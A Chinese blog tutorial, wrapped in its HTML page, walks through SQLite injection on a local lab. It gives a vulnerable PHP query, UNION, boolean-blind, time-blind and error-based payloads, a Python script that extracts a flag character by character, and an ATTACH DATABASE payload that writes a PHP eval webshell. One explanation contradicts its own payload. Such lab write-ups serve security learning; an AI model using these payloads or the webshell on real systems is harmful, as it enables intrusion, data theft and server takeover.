@@ -1,0 +1,234 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="K1r1t5u6u"><meta name="copyright" content="K1r1t5u6u"><meta name="generator" content="Hexo 7.3.0"><meta name="theme" content="hexo-theme-yun"><title>SQLite注入 | K1r1t5u6uのHexo</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.5.3/dist/earth/earth-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"web218.github.io","root":"/","title":"逆水行舟不进则退","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="一.SQLite注入攻击搞清楚SQLite注入之前，我们需要清楚SQLite的数据库结构： SQLite数据库独特的点在于：一个.db文件对应一个数据库，一个数据库中有若干个表 123                     sqlitr结构：                     test.db|sqlite_master（tables1）| |tables2| |tables3| ....">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLite注入">
+<meta property="og:url" content="https://web218.github.io/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="K1r1t5u6uのHexo">
+<meta property="og:description" content="一.SQLite注入攻击搞清楚SQLite注入之前，我们需要清楚SQLite的数据库结构： SQLite数据库独特的点在于：一个.db文件对应一个数据库，一个数据库中有若干个表 123                     sqlitr结构：                     test.db|sqlite_master（tables1）| |tables2| |tables3| ....">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://web218.github.io/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260722200739643.png">
+<meta property="og:image" content="https://web218.github.io/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260722200815652.png">
+<meta property="og:image" content="https://web218.github.io/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260722201002349.png">
+<meta property="og:image" content="https://web218.github.io/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260722201049066.png">
+<meta property="og:image" content="https://web218.github.io/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260722201159719.png">
+<meta property="og:image" content="https://web218.github.io/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260722201409625.png">
+<meta property="og:image" content="https://web218.github.io/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260722201716137.png">
+<meta property="og:image" content="https://web218.github.io/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260722203217561.png">
+<meta property="og:image" content="https://web218.github.io/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260723090049867.png">
+<meta property="og:image" content="https://web218.github.io/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260723104112147.png">
+<meta property="og:image" content="https://web218.github.io/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260723104243729.png">
+<meta property="og:image" content="https://web218.github.io/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260723121522431.png">
+<meta property="og:image" content="https://web218.github.io/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260723121426720.png">
+<meta property="article:published_time" content="2026-07-23T05:30:00.000Z">
+<meta property="article:modified_time" content="2026-07-23T05:25:11.348Z">
+<meta property="article:author" content="K1r1t5u6u">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="SQLite">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="数据库安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://web218.github.io/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260722200739643.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="#" title="K1r1t5u6u"><img width="96" loading="lazy" src="/images/wgqs.jpg" alt="K1r1t5u6u"></a><div class="site-author-name"><a href="#">K1r1t5u6u</a></div><span class="site-name">K1r1t5u6uのHexo</span><sub class="site-subtitle">逆水行舟</sub><div class="site-description">不进则退</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">14</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">13</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.jiongciyuan1.cc/" title="番剧网站" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:rss-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/web218" title="GitHub" target="_blank" style="color:#181717"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://mail.163.com" title="网易邮箱" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/3537106320230948" title="哔哩哔哩" target="_blank" style="color:#FF8EB3"><span class="icon iconify" data-icon="ri:bilibili-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://qm.qq.com/q/3nByicuAkg" title="QQ" target="_blank" style="color:#87CEEB"><span class="icon iconify" data-icon="ri:qq-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80-SQLite%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">1.</span> <span class="toc-text">一.SQLite注入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-sqlite%E5%B8%B8%E8%A7%84%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">1.0.1.</span> <span class="toc-text">0x01 sqlite常规注入攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E5%9F%BA%E4%BA%8Esqlite%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.0.2.</span> <span class="toc-text">0x02.基于sqlite的布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-sqlite%E7%9A%84%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.0.3.</span> <span class="toc-text">0x03.sqlite的时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.0.4.</span> <span class="toc-text">0x04 基于报错的布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-SQLite%E5%86%99%E5%85%A5WebShell"><span class="toc-number">1.0.5.</span> <span class="toc-text">0x05 SQLite写入WebShell</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://web218.github.io/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="K1r1t5u6u"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="K1r1t5u6uのHexo"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">SQLite注入</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2026-07-23 13:30:00" itemprop="dateCreated datePublished" datetime="2026-07-23T13:30:00+08:00">2026-07-23</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Web%E5%AE%89%E5%85%A8/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Web安全</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/Web%E5%AE%89%E5%85%A8/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">Web安全</span></a><a class="tag-item" href="/tags/SQLite/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">SQLite</span></a><a class="tag-item" href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">SQL注入</span></a><a class="tag-item" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">数据库安全</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="一-SQLite注入攻击"><a href="#一-SQLite注入攻击" class="headerlink" title="一.SQLite注入攻击"></a>一.SQLite注入攻击</h1><p>搞清楚SQLite注入之前，我们需要清楚SQLite的数据库结构：</p>
+<p>SQLite数据库独特的点在于：一个.db文件对应一个数据库，一个数据库中有若干个表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">                     sqlitr结构：</span><br><span class="line">                     test.db</span><br><span class="line">|sqlite_master（tables1）| |tables2| |tables3| .... </span><br></pre></td></tr></table></figure>
+
+<p> 主表为sqlite_master ，sqlite_master中有若干字段，存储着以下信息：</p>
+<table>
+<thead>
+<tr>
+<th>列名</th>
+<th>类型</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>type</strong></td>
+<td>TEXT</td>
+<td>对象类型，可以是 <code>&#39;table&#39;</code>、<code>&#39;index&#39;</code>、<code>&#39;view&#39;</code>、<code>&#39;trigger&#39;</code> 之一</td>
+</tr>
+<tr>
+<td><strong>name</strong></td>
+<td>TEXT</td>
+<td>对象的名称（如表名、索引名、视图名等）</td>
+</tr>
+<tr>
+<td><strong>tbl_name</strong></td>
+<td>TEXT</td>
+<td>对象所属的表名（对于表和视图，<code>tbl_name</code> 等于 <code>name</code>；对于索引和触发器，<code>tbl_name</code> 是该索引&#x2F;触发器所依附的表名）</td>
+</tr>
+<tr>
+<td><strong>rootpage</strong></td>
+<td>INTEGER</td>
+<td>对象在数据库文件中的根页号（B-tree 根页），一般不用于注入</td>
+</tr>
+<tr>
+<td><strong>sql</strong></td>
+<td>TEXT</td>
+<td>创建该对象的 SQL 语句（<code>CREATE TABLE/INDEX/VIEW/TRIGGER</code> 的完整 DDL）</td>
+</tr>
+</tbody></table>
+<p>这与传统的mysql注入有很大的差别 ，接下来我们通过kali来做演示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">╭─ /home/kali/Desktop ··················································································· took 1m 55s with root@kali at 07:33:51 ─╮</span><br><span class="line">╰─❯ sqlite3 test_injection1.db                                                                                                                   ─╯</span><br><span class="line"></span><br><span class="line">SQLite version 3.46.1 2024-08-13 09:16:08</span><br><span class="line">Enter &quot;.help&quot; for usage hints.</span><br><span class="line">sqlite&gt; CREATE TABLE users (</span><br><span class="line">    id INTEGER PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">    username TEXT NOT NULL,</span><br><span class="line">    password TEXT,</span><br><span class="line">    created_at DATETIME DEFAULT CURRENT_TIMESTAMP</span><br><span class="line">)</span><br><span class="line">   ...&gt; ;</span><br><span class="line">sqlite&gt; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>sqlite的登入方法为：sqlite3 数据库文件 , 我们登录进sqlite数据并创建了一张名为users的表 包含了id,username,password,created_at字段</p>
+<p>我们先通过命令select sql from sqlite_master; 来查询每张表的建表数据（表，列，以及字段名等）这在sqlite注入攻击中也非常重要</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sqlite&gt; select sql from sqlite_master;</span><br><span class="line">CREATE TABLE users (</span><br><span class="line">    id INTEGER PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">    username TEXT NOT NULL,</span><br><span class="line">    password TEXT,</span><br><span class="line">    created_at DATETIME DEFAULT CURRENT_TIMESTAMP</span><br><span class="line">)</span><br><span class="line">CREATE TABLE sqlite_sequence(name,seq)</span><br><span class="line">sqlite&gt; </span><br></pre></td></tr></table></figure>
+
+<p>从上面的例子我们可以看到select sql from sqlite_master 让我们成功看到了user表的建表数据</p>
+<h3 id="0x01-sqlite常规注入攻击"><a href="#0x01-sqlite常规注入攻击" class="headerlink" title="0x01 sqlite常规注入攻击"></a>0x01 sqlite常规注入攻击</h3><p>原理和许多sql注入一样，未验证用户输入导致拼接后台数据库查询语句导致非预期查询</p>
+<p>类似以下例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$rows</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$rows</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="variable">$rows</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="string">&#x27;empty&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable">$error</span> = <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>username 被拼接到$sql变量中的sql语句导致非预期查询</p>
+<p>来到靶场：</p>
+<img src="/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260722200739643.png" class="" loading="lazy">
+
+<p>提示让我们输入admin </p>
+<img src="/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260722200815652.png" class="" loading="lazy">
+
+<p>观察执行的sql语句是单引号，使用单引号进行闭合</p>
+<p>并使用–将后面的引号注释掉</p>
+<img src="/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260722201002349.png" class="" loading="lazy">
+
+<p>接下来使用order by 来判断列数：</p>
+<img src="/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260722201049066.png" class="" loading="lazy">
+
+<p>报出错between5 那就说明一共有5列：</p>
+<img src="/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260722201159719.png" class="" loading="lazy">
+
+<p>依然使用UNION SELECT 注入 这点和mysql没有区别，1,2,3,4,5都有回显位，我们使用刚刚的语句来爆出初始信息：每张表的建表语句：</p>
+<img src="/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260722201409625.png" class="" loading="lazy">
+
+<p>通过语句可以得知一共建了三张表，重点观察第一张secrets表，里面存在flag列：</p>
+<p>那么：select flag from secrets; </p>
+<img src="/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260722201716137.png" class="" loading="lazy">
+
+<p>成功获得flag</p>
+<h3 id="0x02-基于sqlite的布尔盲注"><a href="#0x02-基于sqlite的布尔盲注" class="headerlink" title="0x02.基于sqlite的布尔盲注"></a>0x02.基于sqlite的布尔盲注</h3><p>布尔盲注不会有回显的点，只能观察页面的状态来进行判断：</p>
+<p>-1’ or substr((select group_concat(sql) from sqlite_master),1,1)&#x3D;’C’– 故意输错-1 ，这样能才能真正观察到数据，否则输入admin’ 无论如何页面都是显示成立状态：</p>
+<img src="/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260722203217561.png" class="" loading="lazy">
+
+<p>先解释一下payload的相关函数：-1’ or substr((select group_concat(sql) from sqlite_master),1,1)&#x3D;’C’–</p>
+<p>(select group_concat(sql) from sqlite_master)  用于聚合查询会将多数据用,分割，substr用于截取字符，有3个参数，第一位也就是(select group_concat(sql) from sqlite_master) ,也就是字符串，在sqlite注入中就是通过sql字段查询建表语句，第二个参数1 是建表语句中第一个字母，第三个1也就是截取几个字符 整个Payload的含义就是判断建表语句的第一个字母是否为C</p>
+<p> 通过图中回显结果，我们的推测显然是正确的，因此可以写脚本来对其进行爆数据操作：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://127.0.0.1:8888/level3.php&quot;</span></span><br><span class="line">CHARSET = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789_&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">payload</span>):</span><br><span class="line">    data = urllib.parse.urlencode(&#123;<span class="string">&quot;username&quot;</span>: payload&#125;).encode()</span><br><span class="line">    resp = urllib.request.urlopen(URL, data, timeout=<span class="number">10</span>)</span><br><span class="line">    body = resp.read().decode(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;欢迎回来&quot;</span> <span class="keyword">in</span> body</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> CHARSET:</span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27; AND SUBSTR((SELECT flag FROM secrets),<span class="subst">&#123;pos&#125;</span>,1)=&#x27;<span class="subst">&#123;ch&#125;</span>&#x27; --&quot;</span></span><br><span class="line">        <span class="keyword">if</span> test(payload):</span><br><span class="line">            flag += ch</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] (<span class="subst">&#123;pos&#125;</span>) <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 第 <span class="subst">&#123;pos&#125;</span> 位未匹配到，flag 提取完毕&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\n🏁 Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-sqlite的时间盲注"><a href="#0x03-sqlite的时间盲注" class="headerlink" title="0x03.sqlite的时间盲注"></a>0x03.sqlite的时间盲注</h3><p>在sqlite中没有类似于mysql的传统时间延迟函数，而是通过<code>randomblob()</code> 生成一个BLOB（二进制大对象）消耗数据库性能导致延迟效果的 randomblob() 的用法为：</p>
+<p>randomblob(1); 生成数据大小为1字节的BLOB，我们要想让其产生延迟就要生成字节很大的Blob对象</p>
+<p> 来看题目：</p>
+<img src="/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260723090049867.png" class="" loading="lazy">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; or (case when(substr((select group_concat(sql) from sqlite_master),1,1)=&#x27;C&#x27;) then randomblob(300000000) else 0 end)--</span><br></pre></td></tr></table></figure>
+
+<p>sqlite中没有if………else 只能使用case..when ,这个payload的含义是截取sqlite版本的第一个字符判断是否为3，如果是3的话通过 randomblob(300000000)生成超大字节数据造成延迟 </p>
+<p>把上面的版本号改一下就可以了 </p>
+<h3 id="0x04-基于报错的布尔盲注"><a href="#0x04-基于报错的布尔盲注" class="headerlink" title="0x04 基于报错的布尔盲注"></a>0x04 基于报错的布尔盲注</h3><p>这里我们需要了解一下abs()函数:</p>
+<p>abs函数用于计算绝对值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlite&gt; select abs(1);</span><br><span class="line">1</span><br><span class="line">sqlite&gt; select abs(-1);</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>但是当abs()去计算一个特殊值0x8000000000000000 也就是即 -9223372036854775808 会触发溢出错误，我们可以利用这点配合substr就可以达到预期效果：如果第一个字符为正确的值就不会出现任何结果，页面正常 如果字符判断错误则触发整数溢出报错</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND abs(CASE WHEN (SUBSTR((SELECT flag FROM secrets),1,1)=&#x27;f&#x27;) THEN 0 ELSE 0x8000000000000000 END)</span><br></pre></td></tr></table></figure>
+
+<p> 猜对了 → 返回 0 猜错了则触发溢出报错</p>
+<img src="/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260723104112147.png" class="" loading="lazy">
+
+<p>flag的第一个字符是”f”  我们将第一个改为a看看会有什么结果：</p>
+<img src="/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260723104243729.png" class="" loading="lazy">
+
+<p>可以看到了触发溢出错误，基于这点编写脚本即可</p>
+<h3 id="0x05-SQLite写入WebShell"><a href="#0x05-SQLite写入WebShell" class="headerlink" title="0x05 SQLite写入WebShell"></a>0x05 SQLite写入WebShell</h3><p>开始这点之前 我们需要知道ATTACH DATABASE 该命令用于创建数据库文件除了用sqlite3 xxx.db我们也可以通过这个方法来进行创建数据库文件 也可以进行附加操作</p>
+<p>假设存在多个数据库文件 .db的时候  ATTACH  可以指定一个数据库文件附加进当前数据库下 类似mysql的多个数据库的效果</p>
+<p>当存在一个a.db的时候，如果没有这个文件则会创建这个文件，如果存在a.db则会附加</p>
+<p>语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attach [database] filename as database_name;</span><br></pre></td></tr></table></figure>
+
+<p>那么如何通过该语句来写Webshell呢？</p>
+<p>通过创建数据库文件，再创建表，再将payload插入表中 最后由php解析：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE &#x27;F:\sqlite_injection_lab\shell.php&#x27; AS shell;create TABLE shell.exp (payload text); insert INTO shell.exp (payload) VALUES (&#x27;&lt;?php @eval($_POST[&quot;x&quot;]); ?&gt;&#x27;); --</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260723121522431.png" class="" loading="lazy">
+
